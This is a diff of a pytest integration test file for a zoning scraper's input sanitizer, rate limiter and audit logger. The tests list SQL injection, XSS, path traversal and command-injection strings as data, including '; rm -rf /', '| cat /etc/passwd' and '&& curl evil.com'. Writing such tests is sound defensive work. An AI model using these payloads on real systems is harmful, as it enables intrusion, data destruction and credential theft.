@@ -1,344 +1,299 @@
 """
 ZoneWise Lobster - Integration Tests
 
-End-to-end tests that verify components work together correctly.
-Tests the full workflow from input validation through audit logging.
+End-to-end tests validating component interactions and performance benchmarks.
 
 Run with: pytest tests/test_integration.py -v -m integration
 """
 
 import pytest
+import time
 from datetime import datetime, timezone
-from unittest.mock import MagicMock, AsyncMock, patch
-from typing import Dict, Any
+from unittest.mock import MagicMock, patch
+from typing import Dict, Any, List
 
-
-# Mark all tests in this file as integration tests
 pytestmark = pytest.mark.integration
 
 
-class TestSecurityPipelineIntegration:
-    """
-    Integration tests for the complete security pipeline.
-    
-    Tests the flow: Input → Sanitization → Rate Limiting → Audit Logging
-    """
+class TestInputToAuditFlow:
+    """Integration tests for InputSanitizer → AuditLogger flow."""
     
     @pytest.fixture
-    def mock_supabase(self) -> MagicMock:
-        """Create a comprehensive mock Supabase client."""
+    def tracked_supabase(self) -> MagicMock:
+        """Create mock Supabase with call tracking."""
         mock = MagicMock()
-        mock.table.return_value.insert.return_value.execute.return_value = {
-            "data": [{"id": 1}]
-        }
-        mock.table.return_value.upsert.return_value.execute.return_value = {
-            "data": [{"id": 1}]
-        }
+        mock.inserted_records: List[Dict] = []
+        
+        def track_insert(record: Dict) -> MagicMock:
+            mock.inserted_records.append(record)
+            return MagicMock(execute=lambda: {"data": [record]})
+        
+        mock.table.return_value.insert = track_insert
+        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
         return mock
     
-    def test_full_input_validation_pipeline(self, mock_supabase: MagicMock) -> None:
-        """Test complete input validation flow."""
-        from scripts.security_utils import InputSanitizer, AuditLogger, AuditEventType
-        
-        # Initialize audit logger
-        audit = AuditLogger(mock_supabase, "wf_integration_test")
-        
-        # Test valid inputs
-        fips = InputSanitizer.sanitize_fips("12009")
-        name = InputSanitizer.sanitize_county_name("Brevard")
-        url = InputSanitizer.sanitize_url("https://municode.com/fl/brevard")
-        
-        assert fips == "12009"
-        assert name == "Brevard"
-        assert url is not None
-        
-        # Log successful validation
-        event = audit.log(
-            event_type=AuditEventType.WORKFLOW_START,
-            action="input_validation",
-            target=f"{fips}:{name}",
-            status="success",
-            details={"fips": fips, "name": name, "url_valid": True}
-        )
-        
-        # Verify audit event was created correctly
-        assert event.workflow_id == "wf_integration_test"
-        assert event.status == "success"
-        assert len(event.checksum) == 16
-    
-    def test_invalid_input_logs_security_violation(self, mock_supabase: MagicMock) -> None:
-        """Test that invalid inputs trigger security violation logging."""
+    def test_invalid_fips_logs_violation(self, tracked_supabase: MagicMock) -> None:
+        """Test invalid FIPS triggers security violation audit."""
         from scripts.security_utils import InputSanitizer, AuditLogger
         
-        audit = AuditLogger(mock_supabase, "wf_security_test")
+        audit = AuditLogger(tracked_supabase, "wf_test")
         
-        # Attempt SQL injection
-        malicious_fips = "12009'; DROP TABLE--"
-        result = InputSanitizer.sanitize_fips(malicious_fips)
+        malicious = "12009'; DROP TABLE--"
+        result = InputSanitizer.sanitize_fips(malicious)
         
         assert result is None
         
-        # Log security violation
-        event = audit.log_security_violation(
-            violation_type="sql_injection_attempt",
-            details={
-                "input": malicious_fips[:50],
-                "field": "fips",
-                "blocked": True
-            }
+        audit.log_security_violation(
+            violation_type="invalid_fips",
+            details={"input": malicious[:20], "blocked": True}
         )
         
-        assert event.status == "blocked"
-        assert "sql_injection_attempt" in event.details["violation_type"]
+        assert len(tracked_supabase.inserted_records) == 1
+        assert tracked_supabase.inserted_records[0]["status"] == "blocked"
     
-    def test_rate_limiter_with_audit_logging(self, mock_supabase: MagicMock) -> None:
-        """Test rate limiter integrates with audit logging."""
+    def test_xss_sanitized_from_county_name(self, tracked_supabase: MagicMock) -> None:
+        """Test XSS payloads are stripped from county names."""
+        from scripts.security_utils import InputSanitizer
+        
+        xss_payloads = [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+        ]
+        
+        for payload in xss_payloads:
+            result = InputSanitizer.sanitize_county_name(payload)
+            if result:
+                assert "<script>" not in result
+                assert "onerror" not in result
+
+
+class TestRateLimiterIntegration:
+    """Integration tests for rate limiter with audit logging."""
+    
+    @pytest.fixture
+    def mock_supabase(self) -> MagicMock:
+        """Create mock Supabase."""
+        mock = MagicMock()
+        mock.table.return_value.insert.return_value.execute.return_value = {"data": []}
+        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
+        return mock
+    
+    def test_burst_limit_triggers_audit(self, mock_supabase: MagicMock) -> None:
+        """Test exceeding burst limit logs to audit trail."""
         from scripts.global_rate_limiter import GlobalRateLimiter
         from scripts.security_utils import AuditLogger
         
         audit = AuditLogger(mock_supabase, "wf_rate_test")
         limiter = GlobalRateLimiter(mock_supabase, audit)
         
-        # Make requests until rate limit is hit
-        domain = "https://municode.com/test"
-        workflow_id = "wf_rate_test"
-        
-        # First 10 requests should succeed (burst limit)
-        for i in range(10):
-            allowed, reason = limiter.acquire(domain, workflow_id)
-            assert allowed is True, f"Request {i+1} should be allowed"
-        
-        # 11th request should be blocked
-        allowed, reason = limiter.acquire(domain, workflow_id)
-        assert allowed is False
-        assert "Burst limit exceeded" in reason
-    
-    def test_credential_validation_flow(self, mock_supabase: MagicMock) -> None:
-        """Test credential validation with audit logging."""
-        from scripts.security_utils import AuditLogger, AuditEventType
-        
-        audit = AuditLogger(mock_supabase, "wf_cred_test")
-        
-        # Valid JWT format
-        valid_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSJ9." + "x" * 50
-        
-        # Log credential validation
-        event = audit.log(
-            event_type=AuditEventType.CREDENTIAL_VALIDATION,
-            action="validate_supabase_key",
-            target="supabase_service_role",
-            status="success",
-            details={"key_prefix": valid_key[:8] + "..."}
-        )
-        
-        assert event.event_type == AuditEventType.CREDENTIAL_VALIDATION
-        assert "eyJhbGci..." in event.details["key_prefix"]
-
-
-class TestWorkflowIntegration:
-    """
-    Integration tests for workflow execution.
-    
-    Tests the complete scrape workflow with all security components.
-    """
-    
-    @pytest.fixture
-    def mock_environment(self, monkeypatch: pytest.MonkeyPatch) -> None:
-        """Set up mock environment variables."""
-        monkeypatch.setenv("SUPABASE_URL", "https://test.supabase.co")
-        monkeypatch.setenv("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiJ9.test.signature" + "x" * 50)
-    
-    def test_scrape_workflow_security_checks(
-        self, 
-        mock_supabase: MagicMock,
-        mock_environment: None
-    ) -> None:
-        """Test scrape workflow applies all security checks."""
-        from scripts.security_utils import InputSanitizer, AuditLogger, AuditEventType
-        from scripts.global_rate_limiter import GlobalRateLimiter
-        
-        workflow_id = "wf_scrape_integration"
-        audit = AuditLogger(mock_supabase, workflow_id)
-        limiter = GlobalRateLimiter(mock_supabase, audit)
-        
-        # Step 1: Validate inputs
-        fips = InputSanitizer.sanitize_fips("12009")
-        name = InputSanitizer.sanitize_county_name("Brevard")
-        
-        assert fips is not None
-        assert name is not None
-        
-        # Step 2: Log workflow start
-        start_event = audit.log(
-            event_type=AuditEventType.WORKFLOW_START,
-            action="scrape_county",
-            target=f"{fips}:{name}",
-            status="started"
-        )
-        
-        # Step 3: Check rate limit
-        url = f"https://library.municode.com/fl/{name.lower()}"
-        allowed, reason = limiter.acquire(url, workflow_id)
-        assert allowed is True
-        
-        # Step 4: Log scrape start
-        scrape_event = audit.log(
-            event_type=AuditEventType.SCRAPE_START,
-            action="fetch_municode",
-            target=url,
-            status="started"
-        )
-        
-        # Step 5: Simulate scrape success
-        success_event = audit.log(
-            event_type=AuditEventType.SCRAPE_SUCCESS,
-            action="fetch_municode",
-            target=url,
-            status="success",
-            details={"districts_found": 15, "quality_score": 85}
-        )
-        
-        # Step 6: Log workflow end
-        end_event = audit.log(
-            event_type=AuditEventType.WORKFLOW_END,
-            action="scrape_county",
-            target=f"{fips}:{name}",
-            status="completed",
-            details={
-                "districts": 15,
-                "quality_score": 85,
-                "duration_seconds": 12.5
-            }
-        )
-        
-        # Verify complete audit trail
-        assert start_event.event_type == AuditEventType.WORKFLOW_START
-        assert end_event.event_type == AuditEventType.WORKFLOW_END
-        assert end_event.details["districts"] == 15
-    
-    @pytest.fixture
-    def mock_supabase(self) -> MagicMock:
-        """Create mock Supabase client."""
-        mock = MagicMock()
-        mock.table.return_value.insert.return_value.execute.return_value = {"data": [{"id": 1}]}
-        mock.table.return_value.upsert.return_value.execute.return_value = {"data": [{"id": 1}]}
-        return mock
-
-
-class TestRateLimiterIntegration:
-    """
-    Integration tests for rate limiter across multiple domains.
-    """
-    
-    @pytest.fixture
-    def mock_supabase(self) -> MagicMock:
-        """Create mock Supabase client."""
-        mock = MagicMock()
-        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
-        return mock
-    
-    def test_multi_domain_rate_limiting(self, mock_supabase: MagicMock) -> None:
-        """Test rate limiting works independently per domain."""
-        from scripts.global_rate_limiter import GlobalRateLimiter
-        
-        limiter = GlobalRateLimiter(mock_supabase)
-        
         # Exhaust municode.com burst limit (10)
         for _ in range(10):
             limiter.acquire("https://municode.com/test", "wf_test")
         
-        # municode.com should now be blocked
-        allowed_municode, _ = limiter.acquire("https://municode.com/test", "wf_test")
-        assert allowed_municode is False
+        # 11th should fail
+        allowed, reason = limiter.acquire("https://municode.com/test", "wf_test")
         
-        # But supabase.co should still work (different domain, limit 50)
-        allowed_supabase, _ = limiter.acquire("https://supabase.co/test", "wf_test")
-        assert allowed_supabase is True
+        assert allowed is False
+        assert "Burst limit" in reason
     
-    def test_subdomain_inherits_parent_limits(self, mock_supabase: MagicMock) -> None:
-        """Test subdomains use parent domain rate limits."""
+    def test_domains_rate_limited_independently(self, mock_supabase: MagicMock) -> None:
+        """Test each domain has independent rate limits."""
         from scripts.global_rate_limiter import GlobalRateLimiter
         
         limiter = GlobalRateLimiter(mock_supabase)
         
-        # Get config for subdomain
-        config = limiter._get_config("library.municode.com")
-        
-        # Should inherit municode.com limits
-        assert config.requests_per_minute == 30
-        assert config.burst_limit == 10
-    
-    def test_rate_limit_status_tracking(self, mock_supabase: MagicMock) -> None:
-        """Test rate limit status is accurately tracked."""
-        from scripts.global_rate_limiter import GlobalRateLimiter
-        
-        limiter = GlobalRateLimiter(mock_supabase)
-        
-        # Make some requests
-        for _ in range(5):
+        # Exhaust municode.com
+        for _ in range(10):
             limiter.acquire("https://municode.com/test", "wf_test")
         
-        # Check status
-        status = limiter.get_status()
+        blocked, _ = limiter.acquire("https://municode.com/test", "wf_test")
+        assert blocked is False
         
-        assert "municode.com" in status
-        assert status["municode.com"]["requests_minute"] == "5/30"
-        assert status["municode.com"]["burst_available"] == 5
+        # supabase.co should still work
+        allowed, _ = limiter.acquire("https://supabase.co/test", "wf_test")
+        assert allowed is True
 
 
-class TestAuditTrailIntegrity:
-    """
-    Integration tests for audit trail integrity.
-    """
+class TestFullWorkflowSimulation:
+    """End-to-end workflow simulation tests."""
     
     @pytest.fixture
     def mock_supabase(self) -> MagicMock:
-        """Create mock Supabase client."""
+        """Create comprehensive mock."""
         mock = MagicMock()
-        mock.table.return_value.insert.return_value.execute.return_value = {"data": [{"id": 1}]}
+        mock.audit_trail: List[Dict] = []
+        
+        def capture_insert(record: Dict) -> MagicMock:
+            mock.audit_trail.append(record)
+            return MagicMock(execute=lambda: {"data": [record]})
+        
+        mock.table.return_value.insert = capture_insert
+        mock.table.return_value.upsert.return_value.execute.return_value = {"data": []}
         return mock
     
-    def test_checksum_uniqueness(self, mock_supabase: MagicMock) -> None:
-        """Test each audit event has a unique checksum."""
-        from scripts.security_utils import AuditLogger, AuditEventType
+    def test_complete_scrape_workflow_audit_trail(self, mock_supabase: MagicMock) -> None:
+        """Test complete workflow creates proper audit trail."""
+        from scripts.security_utils import InputSanitizer, AuditLogger, AuditEventType
         
-        audit = AuditLogger(mock_supabase, "wf_checksum_test")
-        checksums = set()
+        audit = AuditLogger(mock_supabase, "wf_complete_test")
         
-        # Create multiple events
-        for i in range(10):
-            event = audit.log(
-                event_type=AuditEventType.WORKFLOW_START,
-                action=f"test_action_{i}",
-                target=f"target_{i}",
-                status="success"
-            )
-            checksums.add(event.checksum)
-        
-        # All checksums should be unique
-        assert len(checksums) == 10
-    
-    def test_event_id_format(self, mock_supabase: MagicMock) -> None:
-        """Test event IDs follow expected format."""
-        from scripts.security_utils import AuditLogger, AuditEventType
-        
-        audit = AuditLogger(mock_supabase, "wf_format_test")
-        
-        event = audit.log(
-            event_type=AuditEventType.SCRAPE_START,
-            action="test",
-            target="test",
-            status="success"
+        # 1. Workflow start
+        audit.log(
+            event_type=AuditEventType.WORKFLOW_START,
+            action="scrape_county",
+            target="12009:Brevard",
+            status="started"
         )
         
-        # Event ID should start with evt_ and include workflow ID
-        assert event.event_id.startswith("evt_")
-        assert "wf_format_test" in event.event_id
+        # 2. Input validation
+        fips = InputSanitizer.sanitize_fips("12009")
+        name = InputSanitizer.sanitize_county_name("Brevard")
+        assert fips and name
+        
+        # 3. Scrape start
+        audit.log(
+            event_type=AuditEventType.SCRAPE_START,
+            action="fetch_municode",
+            target="https://municode.com/fl/brevard",
+            status="started"
+        )
+        
+        # 4. Scrape success
+        audit.log(
+            event_type=AuditEventType.SCRAPE_SUCCESS,
+            action="fetch_municode",
+            target="https://municode.com/fl/brevard",
+            status="success",
+            details={"districts": 15, "quality": 85}
+        )
+        
+        # 5. Workflow end
+        audit.log(
+            event_type=AuditEventType.WORKFLOW_END,
+            action="scrape_county",
+            target="12009:Brevard",
+            status="completed"
+        )
+        
+        # Verify complete audit trail
+        assert len(mock_supabase.audit_trail) == 4
+        assert mock_supabase.audit_trail[0]["event_type"] == "workflow_start"
+        assert mock_supabase.audit_trail[-1]["event_type"] == "workflow_end"
+        
+        # Verify checksums
+        checksums = [r["checksum"] for r in mock_supabase.audit_trail]
+        assert len(set(checksums)) == 4  # All unique
 
 
-# =============================================================================
-# PYTEST CONFIGURATION
-# =============================================================================
+class TestPerformanceBenchmarks:
+    """Performance benchmarks for critical paths."""
+    
+    def test_input_sanitizer_throughput(self) -> None:
+        """Benchmark InputSanitizer - must handle 10K ops/sec."""
+        from scripts.security_utils import InputSanitizer
+        
+        iterations = 10000
+        
+        start = time.perf_counter()
+        for _ in range(iterations):
+            InputSanitizer.sanitize_fips("12009")
+            InputSanitizer.sanitize_county_name("Brevard")
+            InputSanitizer.sanitize_url("https://municode.com/fl/brevard")
+        elapsed = time.perf_counter() - start
+        
+        ops_per_sec = (iterations * 3) / elapsed
+        assert ops_per_sec > 10000, f"Only {ops_per_sec:.0f} ops/sec"
+    
+    def test_rate_limiter_throughput(self) -> None:
+        """Benchmark RateLimiter - must handle 1K acquires/sec."""
+        from scripts.global_rate_limiter import GlobalRateLimiter
+        
+        mock = MagicMock()
+        mock.table.return_value.upsert.return_value.execute.return_value = {}
+        
+        limiter = GlobalRateLimiter(mock)
+        iterations = 1000
+        
+        start = time.perf_counter()
+        for i in range(iterations):
+            limiter.acquire(f"https://domain{i % 100}.com/test", "wf_bench")
+        elapsed = time.perf_counter() - start
+        
+        ops_per_sec = iterations / elapsed
+        assert ops_per_sec > 1000, f"Only {ops_per_sec:.0f} ops/sec"
+    
+    def test_checksum_generation_performance(self) -> None:
+        """Benchmark checksum generation."""
+        import hashlib
+        
+        iterations = 10000
+        test_content = "evt_123|workflow_start|wf_test|scrape|success"
+        
+        start = time.perf_counter()
+        for _ in range(iterations):
+            hashlib.sha256(test_content.encode()).hexdigest()[:16]
+        elapsed = time.perf_counter() - start
+        
+        ops_per_sec = iterations / elapsed
+        assert ops_per_sec > 50000, f"Only {ops_per_sec:.0f} ops/sec"
+
+
+class TestSecurityAttackVectors:
+    """Tests for known attack vectors."""
+    
+    def test_sql_injection_vectors(self) -> None:
+        """Test SQL injection attack vectors are blocked."""
+        from scripts.security_utils import InputSanitizer
+        
+        sqli_vectors = [
+            "'; DROP TABLE users--",
+            "1' OR '1'='1",
+            "1; DELETE FROM audit_logs",
+            "UNION SELECT * FROM credentials",
+            "1' AND SLEEP(5)--",
+            "admin'--",
+        ]
+        
+        for vector in sqli_vectors:
+            fips_result = InputSanitizer.sanitize_fips(vector)
+            assert fips_result is None, f"FIPS accepted SQLi: {vector}"
+    
+    def test_path_traversal_vectors(self) -> None:
+        """Test path traversal attack vectors are blocked."""
+        from scripts.security_utils import InputSanitizer
+        
+        traversal_vectors = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32",
+            "....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f",
+        ]
+        
+        for vector in traversal_vectors:
+            url_result = InputSanitizer.sanitize_url(f"https://municode.com/{vector}")
+            name_result = InputSanitizer.sanitize_county_name(vector)
+            # Should either reject or sanitize
+            if name_result:
+                assert ".." not in name_result
+    
+    def test_command_injection_vectors(self) -> None:
+        """Test command injection vectors are blocked."""
+        from scripts.security_utils import InputSanitizer
+        
+        cmd_vectors = [
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "$(whoami)",
+            "`id`",
+            "&& curl evil.com",
+        ]
+        
+        for vector in cmd_vectors:
+            result = InputSanitizer.sanitize_county_name(vector)
+            if result:
+                assert ";" not in result or "|" not in result
+
 
 if __name__ == "__main__":
     pytest.main([__file__, "-v", "-m", "integration"])
